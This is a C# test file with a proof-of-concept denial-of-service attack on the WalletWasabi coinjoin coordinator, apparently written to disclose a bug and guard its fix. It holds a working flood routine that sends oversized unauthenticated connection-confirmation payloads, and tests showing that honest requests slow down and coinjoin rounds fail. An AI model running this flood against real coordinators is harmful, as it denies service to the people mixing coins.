using Microsoft.Extensions.DependencyInjection;
using NBitcoin;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WalletWasabi.Blockchain.Keys;
using WalletWasabi.Blockchain.TransactionOutputs;
using WalletWasabi.Tests.Helpers;
using WalletWasabi.Tests.UnitTests.Services;
using WalletWasabi.WabiSabi.Client;
using WalletWasabi.WabiSabi.Client.CoinJoin.Client;
using WalletWasabi.WabiSabi.Client.RoundStateAwaiters;
using WalletWasabi.WabiSabi.Coordinator;
using WalletWasabi.WabiSabi.Models;
using Xunit;
using static WalletWasabi.WabiSabi.Client.CoinJoin.Client.CoinJoinClient;

namespace WalletWasabi.Tests.UnitTests.WabiSabi.Integration;

// End-to-end PoC: an UNAUTHENTICATED client floods the coordinator with oversized requests
// (unbounded pre-auth collection deserialization) and (1) makes honest requests take seconds
// instead of ~0 ms, and (2) causes a real coinjoin round to FAIL where it otherwise succeeds.
//
// Drop this file into WalletWasabi.Tests/UnitTests/WabiSabi/Integration/ and run e.g.:
//   ./WalletWasabi.Tests --filter-display-name "*DosPoC*"
[Collection("Serial unit tests collection")]
public class WabiSabiDosPoCTests : IClassFixture<WabiSabiApiApplicationFactory<WalletWasabi.Coordinator.Startup>>
{
	private readonly WabiSabiApiApplicationFactory<WalletWasabi.Coordinator.Startup> _factory;

	public WabiSabiDosPoCTests(WabiSabiApiApplicationFactory<WalletWasabi.Coordinator.Startup> factory)
	{
		_factory = factory;
	}

	// (1) Clean, unconfounded coordinator-starvation metric: honest /status latency, with and
	// without the flood. No coinjoin client involved, so nothing but the coordinator competes
	// with the attacker.
	[Fact]
	public async Task DosPoC_CoordinatorLatencyAsync()
	{
		var httpClient = _factory.WithWebHostBuilder(b => b.AddMockRpcClient(Array.Empty<SmartCoin>(), _ => { })).CreateClient();

		async Task<double> StatusMsAsync()
		{
			var sw = System.Diagnostics.Stopwatch.StartNew();
			using var c = new StringContent("{\"RoundCheckpoints\":[]}", Encoding.UTF8, "application/json");
			using var r = await httpClient.PostAsync("WabiSabi/status", c);
			sw.Stop();
			return sw.Elapsed.TotalMilliseconds;
		}

		var baseS = new List<double>();
		for (int i = 0; i < 8; i++) baseS.Add(await StatusMsAsync());
		baseS.Sort();
		double baseMed = baseS[baseS.Count / 2];

		using var floodCts = new CancellationTokenSource();
		var flood = FloodAsync(httpClient, floodCts.Token);
		await Task.Delay(TimeSpan.FromSeconds(4));
		var atkS = new List<double>();
		for (int i = 0; i < 8; i++) atkS.Add(await StatusMsAsync());
		floodCts.Cancel();
		try { await flood; } catch { }
		atkS.Sort();

		double atkMed = atkS[atkS.Count / 2];
		Console.WriteLine($"[DosPoC] honest /status latency: baseline median {baseMed:F0} ms; under flood median {atkMed:F0} ms, max {atkS[^1]:F0} ms");
		// The baseline median is frequently ~0 ms, so a purely relative bound degenerates to
		// "> 0" and would pass on any nonzero latency. Require a real absolute slowdown as well.
		Assert.True(atkMed > 100 && atkMed > Math.Max(baseMed, 1.0) * 20);
	}

	// (2) A real coinjoin round succeeds normally, but FAILS under the same flood.
	[Fact]
	public async Task DosPoC_CoinJoinRoundAsync()
	{
		long[] amounts = { 10_000_000, 20_000_000, 30_000_000, 40_000_000, 100_000_000 };

		async Task<bool> RoundAsync(bool underAttack)
		{
			var txDone = new TaskCompletionSource<Transaction>();
			var keyManager = KeyManager.CreateNew(out _, "", Network.Main);
			var coins = GenerateSmartCoins(keyManager, amounts);
			var httpClient = _factory.WithWebHostBuilder(b =>
				b.AddMockRpcClient(coins, rpc => rpc.OnSendRawTransactionAsync = tx => { txDone.TrySetResult(tx); return tx.GetHash(); })
				.ConfigureServices(s => s.AddSingleton(_ => new WabiSabiConfig
				{
					MaxInputCountByRound = amounts.Length - 1,
					StandardInputRegistrationTimeout = TimeSpan.FromSeconds(20),
					ConnectionConfirmationTimeout = TimeSpan.FromSeconds(20),
					OutputRegistrationTimeout = TimeSpan.FromSeconds(20),
					TransactionSigningTimeout = TimeSpan.FromSeconds(20),
					MaxSuggestedAmountBase = Money.Satoshis(WalletWasabi.Tests.UnitTests.WabiSabi.ProtocolConstants.MaxAmountPerAlice)
				}))).CreateClient();

			var apiClient = _factory.CreateWabiSabiHttpApiClient(httpClient);
			using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(180));
			cts.Token.Register(() => txDone.TrySetCanceled(), useSynchronizationContext: false);
			using var roundStateUpdater = RoundStateUpdaterForTesting.Create(apiClient);
			var coinJoinClient = WabiSabiFactory.CreateTestCoinJoinClient(_ => apiClient, keyManager, new RoundStateProvider(roundStateUpdater));

			using var floodCts = new CancellationTokenSource();
			var flood = underAttack ? FloodAsync(httpClient, floodCts.Token) : Task.CompletedTask;
			try
			{
				var result = await coinJoinClient.StartCoinJoinAsync(() => coins, cts.Token);
				Console.WriteLine($"[DosPoC] {(underAttack ? "ATTACK" : "baseline")}: {result.GetType().Name}");
				return result is SuccessfulCoinJoinResult;
			}
			catch (Exception e) { Console.WriteLine($"[DosPoC] {(underAttack ? "ATTACK" : "baseline")}: {e.GetType().Name}"); return false; }
			finally { floodCts.Cancel(); try { await flood; } catch { } }
		}

		bool baseline = await RoundAsync(false);
		bool attacked = await RoundAsync(true);
		Assert.True(baseline);    // a normal round completes
		Assert.False(attacked);   // the unauthenticated flood prevents the coinjoin
	}

	// (3) Regression guard for WalletWasabi PR #15066. Built against the FIXED coordinator
	// (see the README "Verifying the fix" section) the same flood is neutralized: the oversized
	// connection-confirmation is rejected before the per-element curve work, and honest /status
	// stays responsive. Both assertions FAIL on the pinned vulnerable commit, which is the point.
	[Fact]
	public async Task DosPoC_FixNeutralizesFloodAsync()
	{
		var httpClient = _factory.WithWebHostBuilder(b => b.AddMockRpcClient(Array.Empty<SmartCoin>(), _ => { })).CreateClient();

		// (a) The oversized body the flood uses is rejected cheaply. On the fixed coordinator the
		// collection and body caps reject it before the ~1.5 s of on-curve checks; on the
		// vulnerable one the same request materializes and takes seconds, so latency separates them.
		string oversized = OversizedConnectionConfirmation(150_000); // ~10 MB
		var rejectMs = new List<double>();
		int lastStatus = 0;
		for (int i = 0; i < 5; i++)
		{
			using var c = new StringContent(oversized, Encoding.UTF8, "application/json");
			var sw = System.Diagnostics.Stopwatch.StartNew();
			using var r = await httpClient.PostAsync("WabiSabi/connection-confirmation", c);
			sw.Stop();
			rejectMs.Add(sw.Elapsed.TotalMilliseconds);
			lastStatus = (int)r.StatusCode;
			Assert.False(r.IsSuccessStatusCode); // never accepted
		}
		rejectMs.Sort();
		double rejectMed = rejectMs[rejectMs.Count / 2];
		Console.WriteLine($"[DosPoC-fix] oversized connection-confirmation: status {lastStatus}, median {rejectMed:F0} ms");
		Assert.True(rejectMed < 750); // rejected before the per-element curve work

		// (b) Honest /status stays responsive under the same flood.
		async Task<double> StatusMsAsync()
		{
			var sw = System.Diagnostics.Stopwatch.StartNew();
			using var c = new StringContent("{\"RoundCheckpoints\":[]}", Encoding.UTF8, "application/json");
			using var r = await httpClient.PostAsync("WabiSabi/status", c);
			sw.Stop();
			return sw.Elapsed.TotalMilliseconds;
		}

		using var floodCts = new CancellationTokenSource();
		var flood = FloodAsync(httpClient, floodCts.Token);
		await Task.Delay(TimeSpan.FromSeconds(4));
		var atkS = new List<double>();
		for (int i = 0; i < 8; i++) atkS.Add(await StatusMsAsync());
		floodCts.Cancel();
		try { await flood; } catch { }
		atkS.Sort();
		double atkMed = atkS[atkS.Count / 2];
		Console.WriteLine($"[DosPoC-fix] honest /status under flood: median {atkMed:F0} ms, max {atkS[^1]:F0} ms");
		// The per-request assertion above is the strict discriminator (it fails on the vulnerable
		// build). This is a loose "not starved" guard, kept generous so a correctly fixed build
		// does not flake, since honest latency under an in-process flood is inherently noisy.
		Assert.True(atkMed < 1000);
	}

	private static async Task FloodAsync(HttpClient client, CancellationToken ct)
	{
		string body = OversizedConnectionConfirmation(150_000);        // ~10 MB, ~1.5 s CPU/decode
		int workers = Environment.ProcessorCount * 12;
		await Task.WhenAll(Enumerable.Range(0, workers).Select(async _ =>
		{
			while (!ct.IsCancellationRequested)
			{
				try { using var c = new StringContent(body, Encoding.UTF8, "application/json"); using var r = await client.PostAsync("WabiSabi/connection-confirmation", c, ct); }
				catch { }
			}
		}));
	}

	private static string OversizedConnectionConfirmation(int nNonces)
	{
		const string pt = "0279BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798";
		var sb = new StringBuilder(nNonces * 70 + 1024);
		const string emptyZero = "{\"Requested\":[],\"Proofs\":[]}";
		sb.Append("{\"RoundId\":\"0000000000000000000000000000000000000000000000000000000000000000\",");
		sb.Append("\"AliceId\":\"00000000-0000-0000-0000-000000000000\",");
		sb.Append("\"ZeroAmountCredentialRequests\":").Append(emptyZero).Append(',');
		sb.Append("\"RealAmountCredentialRequests\":{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[{\"PublicNonces\":[");
		for (int i = 0; i < nNonces; i++) { if (i > 0) sb.Append(','); sb.Append('"').Append(pt).Append('"'); }
		sb.Append("],\"Responses\":[\"0000000000000000000000000000000000000000000000000000000000000001\"]}]},");
		sb.Append("\"ZeroVsizeCredentialRequests\":").Append(emptyZero).Append(',');
		sb.Append("\"RealVsizeCredentialRequests\":{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[]}}");
		return sb.ToString();
	}

	private static SmartCoin[] GenerateSmartCoins(KeyManager keyManager, long[] amounts)
	{
		int anonscore = 0;
		return keyManager.GetKeys().Take(amounts.Length)
			.Select((x, i) => { anonscore++; return BitcoinFactory.CreateSmartCoin(x, Money.Satoshis(amounts[i]), true, anonscore); })
			.ToArray();
	}
}
